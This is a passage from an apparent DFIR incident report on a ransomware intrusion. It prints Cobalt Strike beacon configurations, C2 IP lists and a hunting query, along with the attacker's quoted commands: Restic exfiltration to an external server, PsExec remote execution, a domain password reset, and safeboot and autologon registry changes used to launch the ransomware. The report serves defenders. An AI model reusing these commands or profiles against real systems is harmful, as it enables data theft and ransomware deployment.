<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">SMB Admin Shares</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>While some of the threat actor&#8217;s payloads were downloaded from a remote resource they also at times transferred their tooling laterally using SMB, and then executed using WMIC or wmiexec.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38788" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_043.png" alt="" width="661" height="454" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_043.png 661w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_043-300x206.png 300w" sizes="(max-width: 661px) 100vw, 661px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="command-and-control" class="wp-block-heading"><a href="#command-and-control">Command and Control</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Over the course of the intrusion the threat actor relied on Sliver and Cobalt Strike. Sliver was used most heavily during the first day of the intrusion with Cobalt Strike then being used over the full length of the intrusion.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38787" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_044.png" alt="" width="2288" height="498" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_044.png 2288w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_044-300x65.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_044-1024x223.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_044-768x167.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_044-1536x334.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_044-2048x446.png 2048w" sizes="(max-width: 2288px) 100vw, 2288px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38786" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_045.png" alt="" width="2272" height="503" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_045.png 2272w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_045-300x66.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_045-1024x227.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_045-768x170.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_045-1536x340.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_045-2048x453.png 2048w" sizes="(max-width: 2272px) 100vw, 2272px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Cobalt Strike</h4>
<!-- /wp:heading -->

<!-- wp:table -->
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
<td>Ja3</td>
<td>Ja3s</td>
<td>ASN Org</td>
<td>ASN</td>
<td>Country</td>
</tr>
<tr>
<td>91.92.250.65</td>
<td>443</td>
<td>72a589da586844d7f0818ce684948eea</td>
<td>f176ba63b4d68e576b5ba345bec2c7b7</td>
<td>LIMENET</td>
<td>394,711</td>
<td>Bulgaria</td>
</tr>
<tr>
<td>91.92.250.60</td>
<td>443</td>
<td>72a589da586844d7f0818ce684948eea</td>
<td>f176ba63b4d68e576b5ba345bec2c7b7</td>
<td>LIMENET</td>
<td>394,711</td>
<td>Bulgaria</td>
</tr>
</tbody>
</table>
</figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>wo14.py Cobalt Strike configuration.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">BeaconType                       - HTTPS
Port                             - 443
SleepTime                        - 38500
MaxGetSize                       - 13982519
Jitter                           - 27
MaxDNS                           - Not Found
PublicKey_MD5                    - 1329384dfdcfde2228da94e2a042f2b4
C2Server                         - 91.92.250.65,/broadcast
UserAgent                        - Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
HttpPostUri                      - /1/events/com.amazon.csm.csa.prod
Malleable_C2_Instructions        - Remove 1308 bytes from the end
                                   Remove 1 bytes from the end
                                   Remove 194 bytes from the beginning
                                   Base64 decode
HttpGet_Metadata                 - ConstHeaders
                                        Accept: application/json, text/plain, */*
                                        Accept-Language: en-US,en;q=0.5
                                        Origin: https://www.amazon.com
                                        Referer: https://www.amazon.com
                                        Sec-Fetch-Dest: empty
                                        Sec-Fetch-Mode: cors
                                        Sec-Fetch-Site: cross-site
                                        Te: trailers
                                   Metadata
                                        base64
                                        header "x-amzn-RequestId"
HttpPost_Metadata                - ConstHeaders
                                        Accept: */*
                                        Origin: https://www.amazon.com
                                   SessionId
                                        base64url
                                        header "x-amz-rid"
                                   Output
                                        base64url
                                        prepend "{"events":[{"data":{"schemaId":"csa.VideoInteractions.1","application":"Retail:Prod:,"requestId":"MBFV82TTQV2JNBKJJ50B","title":"Amazon.com. Spend less. Smile more.","subPageType":"desktop","session":{"id":"133-9905055-2677266"},"video":{"id":""
                                        append ""
"
                                        append ""playerMode":"INLINE","videoRequestId":"MBFV82TTQV2JNBKJJ50B","isAudioOn":"false","player":"IVS","event":"NONE"}}}}]}"
                                        print
PipeName                         - Not Found
DNS_Idle                         - Not Found
DNS_Sleep                        - Not Found
SSH_Host                         - Not Found
SSH_Port                         - Not Found
SSH_Username                     - Not Found
SSH_Password_Plaintext           - Not Found
SSH_Password_Pubkey              - Not Found
SSH_Banner                       -
HttpGet_Verb                     - GET
HttpPost_Verb                    - POST
HttpPostChunk                    - 0
Spawnto_x86                      - %windir%\syswow64\gpupdate.exe
Spawnto_x64                      - %windir%\sysnative\gpupdate.exe
CryptoScheme                     - 0
Proxy_Config                     - Not Found
Proxy_User                       - Not Found
Proxy_Password                   - Not Found
Proxy_Behavior                   - Use IE settings
Watermark_Hash                   - 3Hh1YX4vT3i5C7L2sn7K4Q==
Watermark                        - 587247372
bStageCleanup                    - True
bCFGCaution                      - True
KillDate                         - 0
bProcInject_StartRWX             - True
bProcInject_UseRWX               - False
bProcInject_MinAllocSize         - 16700
ProcInject_PrependAppend_x86     - b'\x90\x90\x90'
                                   Empty
ProcInject_PrependAppend_x64     - b'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
                                   Empty
ProcInject_Execute               - ntdll.dll:RtlUserThreadStart
                                   SetThreadContext
                                   NtQueueApcThread-s
                                   kernel32.dll:LoadLibraryA
                                   CreateRemoteThread
                                   RtlCreateUserThread
ProcInject_AllocationMethod      - NtMapViewOfSection
bUsesCookies                     - False
HostHeader                       -
headersToRemove                  - Not Found
DNS_Beaconing                    - Not Found
DNS_get_TypeA                    - Not Found
DNS_get_TypeAAAA                 - Not Found
DNS_get_TypeTXT                  - Not Found
DNS_put_metadata                 - Not Found
DNS_put_output                   - Not Found
DNS_resolver                     - Not Found
DNS_strategy                     - round-robin
DNS_strategy_rotate_seconds      - -1
DNS_strategy_fail_x              - -1
DNS_strategy_fail_seconds        - -1
Retry_Max_Attempts               - 0
Retry_Increase_Attempts          - 0
Retry_Duration                   - 0
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>wo12.py Cobalt Strike configuration.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">BeaconType                       - HTTPS
Port                             - 443
SleepTime                        - 38500
MaxGetSize                       - 13982519
Jitter                           - 27
MaxDNS                           - Not Found
PublicKey_MD5                    - f27a9b7c29960aaf911f2885b40536c2
C2Server                         - 91.92.250.60,/broadcast
UserAgent                        - Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
HttpPostUri                      - /1/events/com.amazon.csm.csa.prod
Malleable_C2_Instructions        - Remove 1308 bytes from the end
                                   Remove 1 bytes from the end
                                   Remove 194 bytes from the beginning
                                   Base64 decode
HttpGet_Metadata                 - ConstHeaders
                                        Accept: application/json, text/plain, */*
                                        Accept-Language: en-US,en;q=0.5
                                        Origin: https://www.amazon.com
                                        Referer: https://www.amazon.com
                                        Sec-Fetch-Dest: empty
                                        Sec-Fetch-Mode: cors
                                        Sec-Fetch-Site: cross-site
                                        Te: trailers
                                   Metadata
                                        base64
                                        header "x-amzn-RequestId"
HttpPost_Metadata                - ConstHeaders
                                        Accept: */*
                                        Origin: https://www.amazon.com
                                   SessionId
                                        base64url
                                        header "x-amz-rid"
                                   Output
                                        base64url
                                        prepend "{"events":[{"data":{"schemaId":"csa.VideoInteractions.1","application":"Retail:Prod:,"requestId":"MBFV82TTQV2JNBKJJ50B","title":"Amazon.com. Spend less. Smile more.","subPageType":"desktop","session":{"id":"133-9905055-2677266"},"video":{"id":""
                                        append ""
"
                                        append ""playerMode":"INLINE","videoRequestId":"MBFV82TTQV2JNBKJJ50B","isAudioOn":"false","player":"IVS","event":"NONE"}}}}]}"
                                        print
PipeName                         - Not Found
DNS_Idle                         - Not Found
DNS_Sleep                        - Not Found
SSH_Host                         - Not Found
SSH_Port                         - Not Found
SSH_Username                     - Not Found
SSH_Password_Plaintext           - Not Found
SSH_Password_Pubkey              - Not Found
SSH_Banner                       -
HttpGet_Verb                     - GET
HttpPost_Verb                    - POST
HttpPostChunk                    - 0
Spawnto_x86                      - %windir%\syswow64\gpupdate.exe
Spawnto_x64                      - %windir%\sysnative\gpupdate.exe
CryptoScheme                     - 0
Proxy_Config                     - Not Found
Proxy_User                       - Not Found
Proxy_Password                   - Not Found
Proxy_Behavior                   - Use IE settings
Watermark_Hash                   - 3Hh1YX4vT3i5C7L2sn7K4Q==
Watermark                        - 587247372
bStageCleanup                    - True
bCFGCaution                      - True
KillDate                         - 0
bProcInject_StartRWX             - True
bProcInject_UseRWX               - False
bProcInject_MinAllocSize         - 16700
ProcInject_PrependAppend_x86     - b'\x90\x90\x90'
                                   Empty
ProcInject_PrependAppend_x64     - b'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
                                   Empty
ProcInject_Execute               - ntdll.dll:RtlUserThreadStart
                                   SetThreadContext
                                   NtQueueApcThread-s
                                   kernel32.dll:LoadLibraryA
                                   CreateRemoteThread
                                   RtlCreateUserThread
ProcInject_AllocationMethod      - NtMapViewOfSection
bUsesCookies                     - False
HostHeader                       -
headersToRemove                  - Not Found
DNS_Beaconing                    - Not Found
DNS_get_TypeA                    - Not Found
DNS_get_TypeAAAA                 - Not Found
DNS_get_TypeTXT                  - Not Found
DNS_put_metadata                 - Not Found
DNS_put_output                   - Not Found
DNS_resolver                     - Not Found
DNS_strategy                     - round-robin
DNS_strategy_rotate_seconds      - -1
DNS_strategy_fail_x              - -1
DNS_strategy_fail_seconds        - -1
Retry_Max_Attempts               - 0
Retry_Increase_Attempts          - 0
Retry_Duration                   - 0
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The two Cobalt Strike C2 showed the classic HTTP response related to the post-exploitation framework:</p>
<pre>HTTP/1.1 404 Not Found<br />Content-Type: text/plain<br />Date: Day, DD Mmm YYYY HH:MM:SS GMT<br />Content-Length: 0</pre>
<!-- /wp:list -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38785" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_046.png" alt="" width="1015" height="283" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_046.png 1015w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_046-300x84.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_046-768x214.png 768w" sizes="(max-width: 1015px) 100vw, 1015px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_047.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38784" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_047.png" alt="" width="888" height="307" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_047.png 888w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_047-300x104.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_047-768x266.png 768w" sizes="(max-width: 888px) 100vw, 888px" /></a></p>
<p>By diving deeper into the two command and control servers, it was noticed that both of them exposed the HTTP service on port 81 with the following HTTP response.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_048.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38783" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_048.png" alt="" width="546" height="200" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_048.png 546w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_048-300x110.png 300w" sizes="(max-width: 546px) 100vw, 546px" /></a></p>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Therefore, the following FOFA query was built to identify further potential C2 servers matching this pattern.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">"HTTP/1.1 307 Temporary Redirect" &amp;&amp; "Content-Type: text/html; charset=utf-8" &amp;&amp; "Location: https://www.cloudflare.com/" &amp;&amp; "Content-Length: 63" &amp;&amp; port="81" &amp;&amp; protocol="http"
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Some of the first results provided by FOFA via the above-mentioned query were reported by <a href="https://www.rapid7.com/blog/post/2024/05/13/ongoing-malvertising-campaign-leads-to-ransomware/" target="_blank" rel="noreferrer noopener">Rapid7</a> in one of their latest blog posts.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_049.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38782" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_049.png" alt="" width="1197" height="472" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_049.png 1197w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_049-300x118.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_049-1024x404.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_049-768x303.png 768w" sizes="(max-width: 1197px) 100vw, 1197px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Based on FOFA results, all the identified command and control servers were in Bulgaria and the Netherlands.</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td>IP</td>
<td>Country</td>
</tr>
<tr>
<td>91.92.240.175</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.240.194</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.241.117</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.242.182</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.242.39</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.242.55</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.245.174</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.245.175</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.247.123</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.247.127</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.249.110</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.250.148</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.250.158</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.250.60</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.250.65</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.250.66</td>
<td>BG</td>
</tr>
<tr>
<td>91.92.251.240</td>
<td>BG</td>
</tr>
<tr>
<td>94.156.67.175</td>
<td>BG</td>
</tr>
<tr>
<td>94.156.67.180</td>
<td>BG</td>
</tr>
<tr>
<td>94.156.67.185</td>
<td>BG</td>
</tr>
<tr>
<td>94.156.67.188</td>
<td>BG</td>
</tr>
<tr>
<td>141.98.6.195</td>
<td>NL</td>
</tr>
<tr>
<td>193.42.33.14</td>
<td>NL</td>
</tr>
<tr>
<td>194.180.48.165</td>
<td>NL</td>
</tr>
<tr>
<td>194.180.48.42</td>
<td>NL</td>
</tr>
<tr>
<td>194.49.94.21</td>
<td>NL</td>
</tr>
<tr>
<td>194.49.94.22</td>
<td>NL</td>
</tr>
</tbody>
</table>
</figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Furthermore, we noticed that four IP addresses (91.92.250.158, 91.92.251.240, 94.156.67.175, 94.156.67.180) had an untrusted certificate on port 441 with protocol HTTPS associated with Alibaba, when they were active Cobalt Strike servers.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_050.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38781" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_050.png" alt="" width="1465" height="1005" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_050.png 1465w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_050-300x206.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_050-1024x702.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_050-768x527.png 768w" sizes="(max-width: 1465px) 100vw, 1465px" /></a></p>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The certificate serial number (1657766544761773100) was used to identify other possibly used by the same threat actors, and further servers were detected which showed a behavior similar to what was previously described. For example, the IP address 185.73.124.238 shares the same certificate and is, at the time of report writing, an active Cobalt Strike C2 server.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_051.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38780" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_051.png" alt="" width="1448" height="833" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_051.png 1448w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_051-300x173.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_051-1024x589.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_051-768x442.png 768w" sizes="(max-width: 1448px) 100vw, 1448px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>As described in a <a href="https://hunt.io/blog/detecting-redguard-c2-redirector" target="_blank" rel="noreferrer noopener">Hunt.io blog post</a>, these specific certificate attributes like CommonName and Organization are associated with the usage of <a href="https://github.com/wikiZ/RedGuard" target="_blank" rel="noreferrer noopener">RedGuard </a>which is a C2 redirector.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_052.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38779" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_052.png" alt="" width="1406" height="360" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_052.png 1406w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_052-300x77.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_052-1024x262.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_052-768x197.png 768w" sizes="(max-width: 1406px) 100vw, 1406px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Sliver</h4>
<!-- /wp:heading -->

<!-- wp:table -->
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
<td>Ja3</td>
<td>Ja3s</td>
<td>ASN Org</td>
<td>ASN</td>
<td>Country</td>
</tr>
<tr>
<td>194.49.94.18</td>
<td>8443</td>
<td>19e29534fd49dd27d09234e639c4057e</td>
<td>f4febc55ea12b31ae17cfb7e614afda8</td>
<td>Matrix Telecom Ltd</td>
<td>216,419</td>
<td>The Netherlands</td>
</tr>
<tr>
<td>194.169.175.134</td>
<td>8443</td>
<td>d6828e30ab66774a91a96ae93be4ae4c</td>
<td>f4febc55ea12b31ae17cfb7e614afda8</td>
<td>Matrix Telecom Ltd</td>
<td>216,419</td>
<td>The Netherlands</td>
</tr>
</tbody>
</table>
</figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>Both the Sliver servers 194.49.94[.]18 and 194.169.175[.]134 had invalid certificates on port 8443.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_053.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38778" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_053.png" alt="" width="1183" height="528" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_053.png 1183w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_053-300x134.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_053-1024x457.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_053-768x343.png 768w" sizes="(max-width: 1183px) 100vw, 1183px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_054.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38777" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_054.png" alt="" width="1196" height="518" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_054.png 1196w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_054-300x130.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_054-1024x444.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_054-768x333.png 768w" sizes="(max-width: 1196px) 100vw, 1196px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="exfiltration"><a href="#exfiltration">Exfiltration</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>The threat actor used <a href="https://restic.net/" target="_blank" rel="noreferrer noopener">Restic</a>, to exfiltrate directories directly from a file server. Below are the commands used by the threat actor to initiate the backup repository and exfiltrate the data:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">restic.exe -r rest:http://195.123.226.84:8000/ init --password-file ppp.txt
restic.exe -r rest:http://195.123.226.84:8000/ --password-file ppp.txt --use-fs-snapshot --verbose backup "F:\Shares\&lt;REDACTED&gt;\&lt;REDACTED&gt;"
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The threat actor exfiltrated the data over HTTP to server hosted on 195.123.226[.]84 . The different parameters used by the threat actor are:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>&#8220;-r rest&#8221;: The -r option is used to specify the location of the repository where the backup data will be stored, this can be anything from an S3 bucket to a SFTP server. In this case, the Threat Actor used a REST server.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>&#8220;&#8211;password-file&#8221;: This option grabs the backup password from a file, in this case ppp.txt</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>&#8220;&#8211;use-fs-snapshot&#8221;: This option will use the Windows&#8217; Volume Shadow Copy Service (VSS) for creating backups. Restic, according the the documentation, will transparently create a VSS snapshot for each volume that contains files to backup. Files are read from the VSS snapshot instead of the regular filesystem. This allows to backup files that are exclusively locked by another process during the backup.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>&#8220;&#8211;verbose&#8221;: This option is used to print a live status of the backup or the processed files.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>The traffic related to this activity triggered the following Suricata alert: ET USER_AGENTS Go HTTP Client User-Agent . Investigating the Suricata EVE flow logs would reveal the usage of Restic thanks to the Content-Type HTTP header:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">http: {
protocol: "HTTP/1.1",
http_content_type: "application/vnd.x.restic.rest.v2"
}
</pre>
<!-- /wp:preformatted -->

<!-- wp:heading -->
<h2 id="impact" class="wp-block-heading"><a href="#impact">Impact</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>The threat actor dropped and executed two batch scripts, up.bat and 1.bat, remotely using PsExec on targeted servers to perform various operations.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The up.bat script was executed remotely on a domain controller using the following command:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">cmd.exe /C PsExec64.exe -accepteula \\&lt;DOMAIN-CONTROLLER-IP&gt; -c -f -d -s up.bat
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The script contained a one liner to reset the password to a privileged service account:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">net  user REDACTED JapanNight!128 /domain
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The threat actor executed the following command to remotely copy the ransomware binary to the target machines before running the second batch script:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">cmd.exe /C for /f %a in (pc.txt) do copy /y \\&lt;REDACTED&gt;\c$\&lt;REDACTED&gt;.exe \\%a\c$\&lt;REDACTED&gt;.exe
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The second script, 1.bat, was then executed on multiple hosts using the following command:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">cmd.exe /C PsExec64.exe -accepteula @pc.txt -c -f -d -h 1.bat
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The script contained the following commands:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">bcdedit  /set {default} safeboot network 
findstr  /C:"The operation completed successfully." 
reg  add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v *a /t REG_SZ /d "cmd.exe /c C:\&lt;REDACTED-COMPANY-NAME&gt;.exe" /f 
findstr  /C:"The operation completed successfully." 
reg  add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d &lt;REDACTED-DOMAIN-NAME&gt;\backup2 /f
reg  add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d JapanNight!128 /f
reg  add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
timeout  /T 10
shutdown  -r -t 0
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>The above commands were meant to preform the following operations:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The first command uses bcdedit utility to modify and set the default boot configuration of the system to the &#8220;safe mode with networking&#8221;.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The second command is using findstr to check if the previous command executed successfully.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The following reg commands are used to modify the registry and enable automatic logon using the service account, and add the ransomware binary &lt;REDACTED-COMPANY-NAME&gt;.exe to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce to be executed on system&#8217;s start up.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The last commands are used to initiate an immediate system restart after a 10 second delay.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>The ransomware binary &lt;REDACTED-COMPANY-NAME&gt;.exe executed multiple files and utilities, below are the child and grand child processes showing the behavior of this ransomware binary:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">C:\&lt;REDACTED-COMPANY-NAME&gt;.exe
----&gt; C:\example.exe C:\example.exe --access-token REDACTED --safeboot-network
--------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\15991160457623399845550968347370640942 /d Service"
--------&gt; C:\Windows\System32\cmd.exe "cmd" /c "bcdedit /set {current} safeboot network"
--------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "C:\example.exe --safeboot-instance --access-token REDACTED --prop-arg-safeboot-network "
--------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "C:\Windows\TEMP\2-REDACTED-51.exe --safeboot-instance --access-token REDACTED --prop-arg-safeboot-network --prop-file \"C:\example.exe\""
--------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "C:\example.exe --safeboot-instance --access-token REDACTED --prop-arg-safeboot-network "
--------&gt; C:\Windows\SysWOW64\cmd.exe "cmd" /c "C:\Windows\TEMP\2-REDACTED-51.exe --safeboot-instance --access-token REDACTED --prop-arg-safeboot-network --prop-file \"C:\example.exe\""
